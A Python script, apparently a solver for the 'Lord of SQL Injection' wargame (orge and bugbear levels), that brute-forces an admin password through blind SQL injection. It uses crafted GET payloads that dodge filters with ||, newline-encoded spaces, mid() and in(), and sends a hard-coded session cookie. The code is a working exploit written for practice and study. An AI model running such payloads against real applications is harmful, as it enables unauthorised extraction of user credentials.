import http.client

headers={'Cookie':'PHPSESSID=k4qn9hve5nlprqdhhe2av86f51',
         'Content-Type':'application/x-www-form-urlencoded'}
#cookie 세팅
conn=http.client.HTTPSConnection("los.eagle-jump.org")
#los url 세팅

key="Hello admin"
#set key ward

query=''
result=""


print ("start")

'''
for i in range(1,30):
    print("length : ", i)
    query ='/orge_40d2b61f694f72448be9c97d1cea2480.php'
    query +="?pw=1%27%7c%7cid=%27admin%27%20%26%26%20"
    query += "length(pw)="+str(i)+"%20--+"
    conn.request('GET',query,'',headers)
    data=conn.getresponse().read().decode("utf-8")
    if data.find(key) > 0:
        print ("key length :", i)
        length = i
        break
'''
length=8

for i in range(1, length+1):
    for j in range(33, 127):
        print (i, j)
        query ='/bugbear_431917ddc1dec75b4d65a23bd39689f8.php'
        query +='?pw=1&no=1%7c%7c%0aid%0ain%0a("admin")%26%26'
        query += 'mid(pw,'+str(i)+',1)%0ain%0a("'+chr(j)+'")'
        conn.request('GET',query,'',headers)
        data=conn.getresponse().read().decode("utf-8")
        
        if data.find(key) > 0:
            print ("key find :", chr(j))
            result+=chr(j)
            break
print (result)
